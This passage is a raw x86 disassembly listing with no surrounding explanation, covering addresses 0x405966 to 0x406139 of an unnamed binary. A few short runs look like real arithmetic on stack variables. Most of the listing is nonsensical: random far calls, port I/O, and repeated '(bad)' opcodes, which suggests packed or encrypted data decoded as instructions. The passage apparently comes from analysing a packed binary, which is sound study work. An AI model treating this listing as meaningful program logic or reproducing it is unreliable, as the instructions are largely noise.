  405966:	sbb    al,BYTE PTR [eax]
  405968:	pop    edx
  405969:	out    0x84,al
  40596b:	cmp    BYTE PTR [eax-0x406b9f49],dl
  405971:	in     eax,0x52
  405973:	add    DWORD PTR [esi-0x5f],edi
  405976:	mov    edx,DWORD PTR [ebp-0x30]
  405979:	jmp    0x4063dc
  40597e:	mov    edx,DWORD PTR [ebp-0x38]
  405981:	mov    edi,DWORD PTR [ebp-0x4]
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
  405997:	cmp    ebx,edx
  405999:	ja     0x405d01
  40599f:	jmp    0x405cf9
  4059a4:	push   0x20
  4059a6:	outs   dx,BYTE PTR ds:[esi]
  4059a7:	adc    dh,BYTE PTR [eax+edx*2+0x72]
  4059ab:	pusha  
  4059ac:	cli    
  4059ad:	sar    BYTE PTR [eax+0x5f],1
  4059b0:	cmp    BYTE PTR [ecx+0x326a1fc7],bh
  4059b6:	jle    0x405a36
  4059b8:	xor    edi,DWORD PTR [ebp+0x7e]
  4059bb:	jle    0x405a32
  4059bd:	sahf   
  4059be:	add    BYTE PTR [ecx-0x2ea0c7e5],dh
  4059c4:	mov    dl,0x7a
  4059c6:	aaa    
  4059c7:	jnp    0x4059fc
  4059c9:	aas    
  4059ca:	xor    DWORD PTR [edi-0x2cf8640b],eax
  4059d0:	xor    BYTE PTR [eax+0x74],ch
  4059d3:	push   ds
  4059d4:	imul   edi,DWORD PTR [ebp+0x11],0xffffff81
  4059d8:	mov    dl,0x4f
  4059da:	pop    ss
  4059db:	mov    ch,0x27
  4059dd:	push   0x1c954a65
  4059e2:	pop    ss
  4059e3:	xchg   DWORD PTR [ecx],esp
  4059e5:	cmp    eax,0x7891947f
  4059ea:	xlat   BYTE PTR ds:[ebx]
  4059eb:	xor    al,0x9e
  4059ed:	or     DWORD PTR [edx],ebx
  4059ef:	loopne 0x405975
  4059f1:	div    BYTE PTR [ebx+edx*4]
  4059f4:	sbb    sp,WORD PTR [ecx]
  4059f7:	aas    
  4059f8:	imul   eax,edx,0x7c11cab9
  4059fe:	cmp    DWORD PTR [esi+0x68],ebx
  405a01:	mov    ebp,0x31573b96
  405a06:	dec    ebp
  405a07:	sub    al,0x8d
  405a09:	test   edi,0x9dce6ea6
  405a0f:	or     BYTE PTR ds:0x79d9e971,dh
  405a15:	call   0xac0e:0x6d27d646
  405a1c:	xchg   edi,eax
  405a1d:	sbb    eax,0x7f016e10
  405a22:	mov    eax,ds:0xb660b281
  405a27:	xlat   BYTE PTR ds:[ebx]
  405a28:	and    esi,DWORD PTR [eax]
  405a2a:	sti    
  405a2b:	aam    0x6d
  405a2d:	shl    BYTE PTR [ecx],0xfc
  405a30:	and    esi,DWORD PTR [ecx-0x7d]
  405a33:	push   esp
  405a34:	fsub   DWORD PTR [ebx]
  405a36:	loop   0x4059ea
  405a38:	adc    DWORD PTR [ebx+0xf7c427d],ebx
  405a3e:	ret    
  405a3f:	xchg   esi,eax
  405a40:	sbb    al,0x24
  405a42:	in     al,0xb2
  405a44:	in     eax,0xa7
  405a46:	xor    BYTE PTR [ebx],dl
  405a48:	out    0x4d,al
  405a4a:	dec    eax
  405a4b:	cmp    esp,DWORD PTR [edi]
  405a4d:	sub    BYTE PTR ds:0x1b63359d,dl
  405a53:	(bad)  
  405a54:	pop    esp
  405a55:	hlt    
  405a56:	test   al,al
  405a58:	rcl    DWORD PTR [ebx],cl
  405a5a:	jns    0x405a8b
  405a5c:	cmp    al,0xdf
  405a5e:	xchg   ebp,eax
  405a5f:	retf   0xbf15
  405a62:	push   ebx
  405a63:	call   0x3137:0x21be247b
  405a6a:	pop    ecx
  405a6b:	or     cl,BYTE PTR [eax-0xd]
  405a6e:	fsub   DWORD PTR [ecx-0x56]
  405a71:	sti    
  405a72:	and    DWORD PTR [esi-0x2d8d99cd],esi
  405a78:	test   esp,edi
  405a7a:	aam    0x5c
  405a7c:	test   eax,0x7c50fecf
  405a82:	daa    
  405a83:	icebp  
  405a84:	sub    eax,0x8f07a35b
  405a89:	test   eax,0x7f7a93ec
  405a8e:	sub    eax,0xa43349a0
  405a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a94:	jg     0x405a63
  405a96:	pop    ecx
  405a97:	dec    edi
  405a98:	add    BYTE PTR [edi+0x1f256d4d],ah
  405a9e:	popa   
  405a9f:	std    
  405aa0:	cmp    BYTE PTR [eax+0x38],0x1e
  405aa4:	inc    esp
  405aa5:	mov    DWORD PTR [esp+esi*2-0x2964165],esi
  405aac:	adc    eax,0xd1a44118
  405ab1:	mov    ecx,0x625dd439
  405ab6:	std    
  405ab7:	mov    BYTE PTR [ebx+edi*2],bh
  405aba:	mov    bl,0xfa
  405abc:	aad    0x45
  405abe:	xor    eax,0xddb0e801
  405ac3:	jle    0x405abe
  405ac5:	sbb    ecx,edi
  405ac7:	into   
  405ac8:	outs   dx,BYTE PTR ds:[esi]
  405ac9:	add    BYTE PTR [ecx],ch
  405acb:	inc    edx
  405acc:	(bad)  
  405acd:	jmp    0xe3d956a6
  405ad2:	xchg   esi,eax
  405ad3:	std    
  405ad4:	shl    BYTE PTR [ebx+0x35],0x9e
  405ad8:	xor    eax,DWORD PTR ds:0x7a4d82b5
  405ade:	mov    gs,WORD PTR [edx]
  405ae0:	ja     0x405b5c
  405ae2:	es inc ecx
  405ae4:	fs pop ss
  405ae6:	sub    eax,0xafb229ef
  405aeb:	mov    cl,0x91
  405aed:	dec    ecx
  405aee:	leave  
  405aef:	push   edx
  405af0:	jo     0x405ad3
  405af2:	pop    ds
  405af3:	fs jnp 0x405b21
  405af6:	cmp    esi,DWORD PTR [ebp-0x63]
  405af9:	sbb    DWORD PTR [eax-0x43],ecx
  405afc:	dec    esp
  405afd:	mov    ch,0x2f
  405aff:	out    dx,eax
  405b00:	sub    bl,BYTE PTR [esi-0x4630415a]
  405b06:	cmp    al,0xee
  405b08:	outs   dx,DWORD PTR ds:[esi]
  405b09:	adc    BYTE PTR [ecx+ebx*8-0x7e2d4ad9],bl
  405b10:	mov    esi,0x52e02dc7
  405b15:	test   BYTE PTR [ebx],al
  405b17:	xchg   esp,eax
  405b18:	je     0x405aeb
  405b1a:	mov    ?,eax
  405b1c:	daa    
  405b1d:	fldenv [edi-0x6b]
  405b20:	pop    ebx
  405b21:	dec    ebp
  405b22:	fstp   TBYTE PTR [edx-0x2f]
  405b25:	adc    al,0x11
  405b27:	xchg   edx,eax
  405b28:	jmp    0x405afb
  405b2a:	sbb    DWORD PTR [ecx-0x705083f0],ebp
  405b30:	imul   edi,DWORD PTR [eax],0xebd9fc3c
  405b36:	sub    ebx,ecx
  405b38:	mov    WORD PTR [ebp+0x5fbe21],ss
  405b3e:	xor    al,0x46
  405b40:	or     al,0x90
  405b42:	push   ss
  405b43:	icebp  
  405b44:	out    0xa3,eax
  405b46:	fiadd  DWORD PTR [eax]
  405b48:	fldenv [ebx]
  405b4a:	cmp    esp,DWORD PTR [ebx-0x6f862c3e]
  405b50:	jmp    0xdd134495
  405b55:	jmp    0x29dc8a5f
  405b5a:	jns    0x405b6e
  405b5c:	inc    edx
  405b5d:	jnp    0x405b94
  405b5f:	jle    0x405b80
  405b61:	scas   al,BYTE PTR es:[edi]
  405b62:	loop   0x405b3d
  405b64:	xchg   DWORD PTR [eax-0x19bb4875],edi
  405b6a:	hlt    
  405b6b:	arpl   WORD PTR [edi-0x3d],si
  405b6e:	xchg   BYTE PTR [ecx],dh
  405b70:	pop    ss
  405b71:	cs test esp,0xa14c328f
  405b78:	out    0x2e,eax
  405b7a:	jno    0x405b89
  405b7c:	lds    edx,FWORD PTR [ebp+0x7b]
  405b7f:	xor    ebp,eax
  405b81:	clc    
  405b82:	sbb    DWORD PTR [ebx],0x192a4d2c
  405b88:	ja     0x405bbf
  405b8a:	aaa    
  405b8b:	fisttp WORD PTR [esi]
  405b8d:	mov    ch,0x30
  405b8f:	pop    ds
  405b90:	enter  0x36fc,0xad
  405b94:	ja     0x405b1c
  405b96:	in     al,dx
  405b97:	mov    BYTE PTR [esi+0x4],ah
  405b9a:	iret   
  405b9b:	or     eax,0x874e9429
  405ba0:	cmp    BYTE PTR [ebp-0x64],0x86
  405ba4:	push   ss
  405ba5:	dec    ecx
  405ba6:	push   eax
  405ba7:	addr16 aaa 
  405ba9:	jl     0x405b78
  405bab:	dec    eax
  405bac:	mov    al,ds:0xf7c6b08
  405bb1:	sub    eax,0xb0af4f23
  405bb6:	fsub   DWORD PTR [esi-0x57819e84]
  405bbc:	dec    ebx
  405bbd:	(bad)  
  405bbe:	push   edx
  405bbf:	push   ss
  405bc0:	cld    
  405bc1:	pusha  
  405bc2:	fld    QWORD PTR [ebx-0x8dc7f5f]
  405bc8:	or     eax,0xdd80624
  405bcd:	jns    0x405c0c
  405bcf:	ins    BYTE PTR es:[edi],dx
  405bd0:	idiv   BYTE PTR [esi+0xb]
  405bd3:	mov    ch,0x17
  405bd5:	and    al,0x8
  405bd7:	jno    0x405c14
  405bd9:	idiv   DWORD PTR [edi-0x50]
  405bdc:	call   0x4e53b233
  405be1:	cmp    esi,0x89fcb32e
  405be7:	xor    DWORD PTR [ebx-0xed1a880],esi
  405bed:	je     0x405c5c
  405bef:	xchg   edi,eax
  405bf0:	mov    eax,ds:0xcc704929
  405bf5:	and    DWORD PTR [eax+0x50],edx
  405bf8:	popa   
  405bf9:	push   ecx
  405bfa:	retf   0x50d6
  405bfd:	jmp    0xa3df:0x1509d90
  405c04:	cmp    esp,0xffffffdf
  405c07:	sbb    eax,0xbe28371a
  405c0c:	inc    eax
  405c0d:	mov    dl,0x76
  405c0f:	mov    ds:0x5cde1c1a,al
  405c14:	jmp    0x25d99574
  405c19:	mov    edx,DWORD PTR [eax+0x1f]
  405c1c:	in     eax,0x6d
  405c1e:	test   eax,0xa79b9305
  405c23:	add    ah,BYTE PTR [ebx+0x56]
  405c26:	ja     0x405c6a
  405c28:	call   eax
  405c2a:	in     al,dx
  405c2b:	cmp    eax,0x604389bd
  405c30:	sahf   
  405c31:	jo     0x405bb6
  405c33:	dec    ebx
  405c34:	add    al,0x45
  405c36:	push   edi
  405c37:	push   ecx
  405c38:	shl    DWORD PTR [eax-0x3122b71e],0x11
  405c3f:	xchg   BYTE PTR [ebp+0x21],al
  405c42:	test   al,0x43
  405c44:	je     0x405c5c
  405c46:	cwde   
  405c47:	shr    BYTE PTR ds:0xa68e52c,0x2f
  405c4e:	or     al,0x28
  405c50:	push   ebx
  405c51:	cmp    BYTE PTR [esp+esi*2],0x69
  405c55:	pop    ds
  405c56:	push   es
  405c57:	and    al,0x3c
  405c59:	stos   DWORD PTR es:[edi],eax
  405c5a:	or     ebp,DWORD PTR [edx+0x351a1e11]
  405c60:	lods   al,BYTE PTR ds:[esi]
  405c61:	repnz mov dh,0xff
  405c64:	in     al,dx
  405c65:	repz into 
  405c67:	cmp    esi,DWORD PTR [ebx-0x44df0caf]
  405c6d:	cmp    esi,DWORD PTR [ecx+0x15]
  405c70:	test   DWORD PTR [edx+esi*1],ecx
  405c73:	(bad)  
  405c74:	retf   0xd8bc
  405c77:	add    DWORD PTR [edi+0x2e],edx
  405c7a:	out    0x63,eax
  405c7c:	(bad)
  405c80:	xor    DWORD PTR [edi],eax
  405c82:	jl     0x405c51
  405c84:	test   al,0xb4
  405c86:	aam    0x53
  405c88:	sub    bh,BYTE PTR [ebp+0x41]
  405c8b:	pop    es
  405c8c:	add    esp,DWORD PTR [esi-0x49823438]
  405c92:	lahf   
  405c93:	ins    DWORD PTR es:[edi],dx
  405c94:	push   ebx
  405c95:	dec    edx
  405c96:	inc    eax
  405c97:	sbb    al,0xf4
  405c99:	aaa    
  405c9a:	ds dec ebp
  405c9c:	nop
  405c9d:	lahf   
  405c9e:	and    eax,0x342c367c
  405ca3:	push   cs
  405ca4:	iret   
  405ca5:	mov    ch,0x95
  405ca7:	inc    ecx
  405ca8:	pop    edx
  405ca9:	in     eax,dx
  405caa:	inc    eax
  405cab:	mov    eax,DWORD PTR [ebx-0x77]
  405cae:	mov    ebp,0xa145f1c2
  405cb3:	xor    ebx,DWORD PTR [eax]
  405cb5:	test   eax,0x5b28d6b4
  405cba:	imul   ecx,DWORD PTR [esi+0xf],0x8d4255f9
  405cc1:	sbb    esp,ebp
  405cc3:	inc    ebp
  405cc4:	pop    es
  405cc5:	icebp  
  405cc6:	push   ebp
  405cc7:	xchg   BYTE PTR [ecx+0x1],cl
  405cca:	(bad)  
  405ccb:	pusha  
  405ccc:	sar    bl,1
  405cce:	dec    esi
  405ccf:	test   DWORD PTR [eax],ecx
  405cd1:	mov    dl,BYTE PTR [eax]
  405cd3:	pop    ds
  405cd4:	ret    
  405cd5:	sbb    eax,0x1c6f574f
  405cda:	dec    edi
  405cdb:	cs add ah,cl
  405cde:	ins    DWORD PTR es:[edi],dx
  405cdf:	and    BYTE PTR [eax+0xf],dl
  405ce2:	(bad)  
  405ce3:	call   0x7aca3f6c
  405ce8:	push   ecx
  405ce9:	push   esp
  405cea:	lahf   
  405ceb:	fwait
  405cec:	cmp    eax,0x7d02231e
  405cf1:	pop    ebx
  405cf2:	or     edx,DWORD PTR ds:0x955e3667
  405cf8:	retf   0x558b
  405cfb:	int3   
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	outs   dx,DWORD PTR ds:[esi]
  405d2c:	je     0x405d40
  405d2e:	cld    
  405d2f:	das    
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405ccb
  405d38:	repnz stos BYTE PTR es:[edi],al
  405d3a:	imul   BYTE PTR [ecx]
  405d3c:	outs   dx,BYTE PTR ds:[esi]
  405d3d:	jne    0x405d53
  405d3f:	(bad)  
  405d40:	rol    DWORD PTR [edi],cl
  405d42:	test   DWORD PTR [ecx+ebx*2],ecx
  405d45:	aas    
  405d46:	adc    al,0x26
  405d48:	push   edi
  405d49:	or     BYTE PTR [ecx-0xa],cl
  405d4c:	lods   eax,DWORD PTR ds:[esi]
  405d4d:	fst    DWORD PTR [edx-0x2a5eff00]
  405d53:	mov    BYTE PTR [esi+0x0],cl
  405d56:	stos   DWORD PTR es:[edi],eax
  405d57:	jnp    0x405da6
  405d59:	pop    ebx
  405d5a:	dec    dx
  405d5c:	or     eax,eax
  405d5e:	call   0x8e0d:0x35719191
  405d65:	ret    
  405d66:	cmc    
  405d67:	push   ebp
  405d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d69:	pop    es
  405d6a:	and    DWORD PTR [edx],esi
  405d6c:	out    0x25,al
  405d6e:	sub    al,0x9b
  405d70:	xchg   edi,eax
  405d71:	fldcw  WORD PTR [ecx]
  405d73:	jle    0x405db6
  405d75:	fisubr WORD PTR [eax-0x24]
  405d78:	js     0x405d63
  405d7a:	test   al,0x43
  405d7c:	pop    ecx
  405d7d:	sbb    al,0xe5
  405d7f:	call   0x42d122a4
  405d84:	push   es
  405d85:	(bad)  
  405d86:	call   0xcc72:0x8dd66d64
  405d8d:	lock int3 
  405d8f:	in     al,0x69
  405d91:	and    al,0x2d
  405d93:	pop    edi
  405d94:	cdq    
  405d95:	test   al,0x38
  405d97:	sbb    cl,BYTE PTR [edi]
  405d99:	inc    esp
  405d9a:	in     al,dx
  405d9b:	ret    0xd2b6
  405d9e:	sub    eax,0x46460521
  405da3:	inc    ebx
  405da4:	xchg   ebp,eax
  405da5:	and    ecx,DWORD PTR [ebp+0x2a8bea22]
  405dab:	int    0xa8
  405dad:	popf   
  405dae:	js     0x405d48
  405db0:	dec    esp
  405db1:	xchg   BYTE PTR [edi],dh
  405db3:	jecxz  0x405d88
  405db5:	mov    ebx,0x9884b67
  405dba:	sub    eax,ecx
  405dbc:	inc    eax
  405dbd:	or     BYTE PTR [ebx],dh
  405dbf:	scas   al,BYTE PTR es:[edi]
  405dc0:	mov    ds:0x8d9b1603,eax
  405dc5:	ja     0x405e18
  405dc7:	pop    ebp
  405dc8:	mov    esi,0x951d2f37
  405dcd:	inc    ebx
  405dce:	inc    ecx
  405dcf:	mov    ebp,0xcb22f41f
  405dd4:	shr    DWORD PTR [esi*1-0x6e4fa248],0xaa
  405ddc:	cdq    
  405ddd:	pop    esp
  405dde:	mov    al,ds:0xe93a80fd
  405de3:	jp     0x405dba
  405de5:	sahf   
  405de6:	xor    eax,0x97a87d8a
  405deb:	(bad)  es:[esi+0x5e6045]
  405df2:	bnd jno 0x405da7
  405df5:	fist   WORD PTR es:[esi-0x38]
  405df9:	and    DWORD PTR [edi],ecx
  405dfb:	push   0xd38d5fd9
  405e00:	add    DWORD PTR [esi+0x6c7fdd38],0xffffffa0
  405e07:	xor    ebp,DWORD PTR [ecx]
  405e09:	sub    DWORD PTR [ebp+0x1],ebx
  405e0c:	ret    0x33e0
  405e0f:	xlat   BYTE PTR ds:[ebx]
  405e10:	fnstcw WORD PTR [esi-0x4a]
  405e13:	daa    
  405e14:	jecxz  0x405e00
  405e16:	pusha  
  405e17:	(bad)  
  405e18:	aam    0x88
  405e1a:	cmp    al,0x5d
  405e1c:	jmp    0x38df:0x7560f73a
  405e23:	into   
  405e24:	xchg   esi,eax
  405e25:	xor    edi,ebp
  405e27:	inc    ebp
  405e28:	rcr    DWORD PTR [ecx+0x7e],1
  405e2b:	add    dh,BYTE PTR [ebp-0x4f]
  405e2e:	lock cdq 
  405e30:	push   es
  405e31:	mov    ecx,0xa02dcc62
  405e36:	aaa    
  405e37:	ror    DWORD PTR [edx-0x7a],0xca
  405e3b:	dec    edi
  405e3c:	dec    esp
  405e3d:	pop    esi
  405e3e:	mov    ch,0xea
  405e40:	(bad)  
  405e41:	cmp    eax,DWORD PTR [eax+ebx*1-0x5b004c41]
  405e48:	xchg   esi,eax
  405e49:	(bad)  
  405e4a:	xchg   ebp,eax
  405e4b:	fwait
  405e4c:	lock mov ebp,0x143eeb34
  405e52:	cmp    al,0x2d
  405e54:	adc    eax,0xd0b8fcf
  405e59:	ud0    ecx,DWORD PTR [ebp+0x61]
  405e5d:	loope  0x405e0a
  405e5f:	(bad)  
  405e60:	adc    eax,0x4a2ef397
  405e65:	mov    edx,0x42a138b8
  405e6a:	imul   edi,edi,0x2e
  405e6d:	mov    ebp,0xbf232b56
  405e72:	mov    fs,ecx
  405e74:	lods   al,BYTE PTR ds:[esi]
  405e75:	test   al,0xda
  405e77:	jnp    0x405eca
  405e79:	cmove  edi,eax
  405e7c:	fmul   st(4),st
  405e7e:	fwait
  405e7f:	and    eax,0xdbc088c2
  405e84:	dec    ecx
  405e85:	mov    bh,0x7
  405e87:	mov    bh,0x7e
  405e89:	push   cs
  405e8a:	rcl    BYTE PTR [ebx+0x70],1
  405e8d:	in     al,dx
  405e8e:	mov    esp,0x6678623e
  405e93:	push   esi
  405e94:	rcl    esi,0xdf
  405e97:	test   DWORD PTR [ecx],ebp
  405e99:	cli    
  405e9a:	lea    ecx,[ebp+0x64e2eae8]
  405ea0:	fld    QWORD PTR [edx]
  405ea2:	and    cl,cl
  405ea4:	test   bl,ah
  405ea6:	scas   eax,DWORD PTR es:[edi]
  405ea7:	cmp    ch,al
  405ea9:	mov    al,0xc8
  405eab:	loope  0x405e49
  405ead:	ins    BYTE PTR es:[edi],dx
  405eae:	mov    ecx,edx
  405eb0:	and    al,bh
  405eb2:	jne    0x405eeb
  405eb4:	xor    al,0x3d
  405eb6:	aaa    
  405eb7:	(bad)  
  405eb8:	loope  0x405f28
  405eba:	ret    0xcf47
  405ebd:	push   eax
  405ebe:	or     al,0xee
  405ec0:	xchg   esi,eax
  405ec1:	mov    edi,0x5adf33a
  405ec6:	mov    ebp,0xedbf6af1
  405ecb:	icebp  
  405ecc:	xor    al,0xb2
  405ece:	es sbb eax,0xb5e49ae1
  405ed4:	out    dx,al
  405ed5:	dec    eax
  405ed6:	sti    
  405ed7:	cdq    
  405ed8:	or     ah,dh
  405eda:	into   
  405edb:	leave  
  405edc:	repz dec ebx
  405ede:	push   ss
  405edf:	cdq    
  405ee0:	pop    eax
  405ee1:	sbb    DWORD PTR [ecx-0x6b8f6e84],esp
  405ee7:	pop    edx
  405ee8:	pop    edi
  405ee9:	or     eax,0xd020c954
  405eee:	mov    ebp,0xa5ebe2fd
  405ef3:	mov    ecx,0xf6a8db6c
  405ef8:	mov    edi,0x85994737
  405efd:	sbb    BYTE PTR [edi+0x320e3278],bl
  405f03:	bound  edi,QWORD PTR [ebx]
  405f05:	mov    WORD PTR [ebp-0x7c],es
  405f08:	pop    edi
  405f09:	loop   0x405f6d
  405f0b:	aaa    
  405f0c:	icebp  
  405f0d:	xchg   ebx,eax
  405f0e:	sbb    DWORD PTR [edi+ebx*4+0x39ce15e2],edx
  405f15:	sahf   
  405f16:	mov    cl,0x48
  405f18:	dec    ecx
  405f19:	sbb    ebx,eax
  405f1b:	in     al,dx
  405f1c:	jle    0x405f14
  405f1e:	xlat   BYTE PTR ds:[ebx]
  405f1f:	retf   0x8635
  405f22:	sbb    esp,DWORD PTR [edi+0x39]
  405f25:	sahf   
  405f26:	test   al,0x85
  405f28:	mov    dh,0xa
  405f2a:	push   eax
  405f2b:	xor    bl,BYTE PTR [edi-0x355e34ff]
  405f31:	sbb    bh,BYTE PTR [edx+0x4e1b06c9]
  405f37:	xchg   DWORD PTR [ebx+edx*4+0x4a],esi
  405f3b:	xor    BYTE PTR [eax+eax*4-0x396d2065],bl
  405f42:	xchg   esi,eax
  405f43:	dec    ecx
  405f44:	xchg   esi,eax
  405f45:	fcmove st,st(1)
  405f47:	sbb    edx,edi
  405f49:	mov    dh,0xd
  405f4b:	ds mov ebx,0xc76f8521
  405f51:	jmp    0x405f54
  405f53:	fidiv  WORD PTR [ecx+ebx*4]
  405f56:	xor    ebx,DWORD PTR [edi-0xad456c3]
  405f5c:	and    DWORD PTR [ebp-0x52],esp
  405f5f:	mov    ecx,0xce99f2eb
  405f64:	jb     0x405f87
  405f66:	mov    cs,WORD PTR [ebx+0x4e2defd5]
  405f6c:	jne    0x405fd8
  405f6e:	cli    
  405f6f:	mov    cl,BYTE PTR cs:[ebx]
  405f72:	into   
  405f73:	push   eax
  405f74:	mov    ah,0x6
  405f76:	inc    edi
  405f77:	es aad 0x5f
  405f7a:	rdtsc  
  405f7c:	adc    BYTE PTR [edi-0x585963cf],dh
  405f82:	jae    0x405f3e
  405f84:	dec    eax
  405f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f86:	pop    ds
  405f87:	scas   eax,DWORD PTR es:[edi]
  405f88:	jmp    0x405f35
  405f8a:	in     eax,0xa5
  405f8c:	push   edi
  405f8d:	jae    0x405ff6
  405f8f:	lahf   
  405f90:	or     DWORD PTR [ebp-0x5b],0x1e
  405f94:	cmp    dl,BYTE PTR [edi]
  405f96:	outs   dx,BYTE PTR ds:[esi]
  405f97:	scas   eax,DWORD PTR es:[edi]
  405f98:	cmc    
  405f99:	pop    es
  405f9a:	sub    eax,0x9133c556
  405f9f:	jl     0x405f4f
  405fa1:	xchg   ecx,eax
  405fa2:	in     al,0x7c
  405fa4:	inc    eax
  405fa5:	jge    0x405f56
  405fa7:	add    eax,DWORD PTR [edx-0x790d7074]
  405fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fae:	adc    al,0x5d
  405fb0:	test   BYTE PTR [esi-0x271e0637],ch
  405fb6:	outs   dx,DWORD PTR ds:[esi]
  405fb7:	xor    bl,ch
  405fb9:	xor    edi,DWORD PTR [ecx+0x19]
  405fbc:	jmp    0x8ae3:0x1ecea33c
  405fc3:	mov    bh,0x77
  405fc5:	sub    eax,0x29e60851
  405fca:	dec    eax
  405fcb:	jl     0x405f75
  405fcd:	push   0xff448470
  405fd2:	xlat   BYTE PTR ds:[ebx]
  405fd3:	lods   al,BYTE PTR ds:[esi]
  405fd4:	xor    BYTE PTR [edx+0x76],al
  405fd7:	jo     0x405fca
  405fd9:	call   0x2f56:0x531251c1
  405fe0:	loop   0x405f86
  405fe2:	mov    ds:0x36679edd,eax
  405fe7:	inc    ecx
  405fe8:	nop
  405fe9:	inc    esi
  405fea:	and    BYTE PTR [ebx+0x14],0x8d
  405fee:	not    esi
  405ff0:	repnz mov al,0xfb
  405ff3:	jge    0x405f95
  405ff5:	aam    0x3
  405ff7:	xchg   ebx,eax
  405ff8:	sbb    al,0x8d
  405ffa:	push   eax
  405ffb:	adc    eax,0xe57d9144
  406000:	or     eax,0xeb77aa59
  406005:	xchg   ebx,eax
  406006:	sub    eax,0x68dae1b1
  40600b:	loopne 0x405fd5
  40600d:	push   es
  40600e:	fwait
  40600f:	in     eax,dx
  406010:	dec    ebp
  406011:	cli    
  406012:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406013:	int3   
  406014:	cli    
  406015:	add    DWORD PTR [ecx-0x21c07ff8],0x9c2b8ac6
  40601f:	out    dx,eax
  406020:	movsx  eax,si
  406023:	ret    
  406024:	or     BYTE PTR [ecx],al
  406026:	push   es
  406027:	out    dx,eax
  406028:	xchg   ebx,eax
  406029:	mov    bl,0xbc
  40602b:	aam    0xd
  40602d:	pop    es
  40602e:	xor    esi,esp
  406030:	xor    dl,ah
  406032:	daa    
  406033:	out    0xd8,al
  406035:	push   es
  406036:	and    eax,0xe972d9c
  40603b:	jns    0x405fd6
  40603d:	ja     0x405ffa
  40603f:	sbb    al,0x69
  406041:	adc    BYTE PTR [ebx+edx*2-0x65dd58a9],cl
  406048:	push   es
  406049:	push   0x5e
  40604b:	push   ebx
  40604c:	cmp    ebp,esp
  40604e:	idiv   BYTE PTR [esi-0x4d]
  406051:	sub    al,0x7b
  406053:	popa   
  406054:	shl    DWORD PTR [eax+0x20],0x40
  406058:	test   eax,0x5c47cacd
  40605d:	adc    eax,0x3de89232
  406062:	addr16 cli 
  406064:	imul   eax,ecx,0xfcc41a13
  40606a:	fsubr  QWORD PTR [ebx+0x6]
  40606d:	dec    edx
  40606e:	push   ss
  40606f:	fisubr WORD PTR [esp+eiz*2]
  406072:	xchg   edx,eax
  406073:	and    BYTE PTR [ebx],bh
  406075:	fimul  DWORD PTR [ebx+0x55e9c855]
  40607b:	add    eax,DWORD PTR [eax]
  40607d:	add    BYTE PTR [ecx+0x68f06eef],ch
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0xee
  40608b:	inc    ebx
  40608c:	cmp    dl,BYTE PTR [ebx-0x20]
  40608f:	cmp    eax,0x7d337e7e
  406094:	jle    0x406114
  406096:	(bad)  
  406097:	mov    bh,0x6e
  406099:	pop    edx
  40609a:	repnz or eax,0x54aa881e
  4060a0:	stc    
  4060a1:	sbb    BYTE PTR [ecx+ecx*4],0x2d
  4060a5:	xor    eax,0xacb33a1
  4060aa:	adc    DWORD PTR [ebp+ecx*1-0x2b],ebp
  4060ae:	mov    cl,0x26
  4060b0:	pop    es
  4060b1:	(bad)  
  4060b2:	popa   
  4060b3:	xchg   esp,eax
  4060b4:	pop    ebp
  4060b5:	shl    BYTE PTR [edx+ebx*8],0xea
  4060b9:	jge    0x406131
  4060bb:	cmp    DWORD PTR [ebp+0x20],esp
  4060be:	iret   
  4060bf:	ret    0xe06a
  4060c2:	mov    eax,ds:0xfa6d8af9
  4060c7:	push   cs
  4060c8:	cdq    
  4060c9:	loope  0x40611b
  4060cb:	dec    esp
  4060cc:	popf   
  4060cd:	imul   edi,ebx,0xab60b4a0
  4060d3:	jns    0x40614e
  4060d5:	stos   DWORD PTR es:[edi],eax
  4060d6:	mov    dl,0x52
  4060d8:	pop    eax
  4060d9:	jb     0x40609f
  4060db:	mov    edi,0x357d0075
  4060e0:	fisttp QWORD PTR [edi]
  4060e2:	xor    ebx,DWORD PTR ds:0xd994b864
  4060e8:	daa    
  4060e9:	lods   eax,DWORD PTR ds:[esi]
  4060ea:	jae    0x4060be
  4060ec:	cli    
  4060ed:	pop    ds
  4060ee:	xchg   esp,eax
  4060ef:	jnp    0x40615f
  4060f1:	mov    al,0x82
  4060f3:	xor    dh,BYTE PTR [ebp-0x41]
  4060f6:	or     esi,DWORD PTR [ecx+0x3b]
  4060f9:	sbb    DWORD PTR [edi-0x4c],esp
  4060fc:	add    eax,0xa61427e6
  406101:	sti    
  406102:	mov    ebx,0x3129c5eb
  406107:	ds mov esi,0x4dcb194d
  40610d:	fisttp QWORD PTR [edx+0x20001e0c]
  406113:	loop   0x4060a1
  406115:	mov    dl,BYTE PTR [ecx-0x190a2308]
  40611b:	fdiv   QWORD PTR [esi]
  40611d:	(bad)  
  40611e:	adc    edi,DWORD PTR ds:0x43ab481b
  406124:	lds    ecx,FWORD PTR [edx-0x2]
  406127:	(bad)  
  406128:	cli    
  406129:	neg    edx
  40612b:	je     0x4060d9
  40612d:	mov    ds:0x8c9b1d39,eax
  406132:	sub    al,0xea
  406134:	into   
  406135:	xchg   ecx,eax
  406136:	stos   BYTE PTR es:[edi],al
  406137:	das    
  406138:	pop    ecx
  406139:	xchg   edx,eax
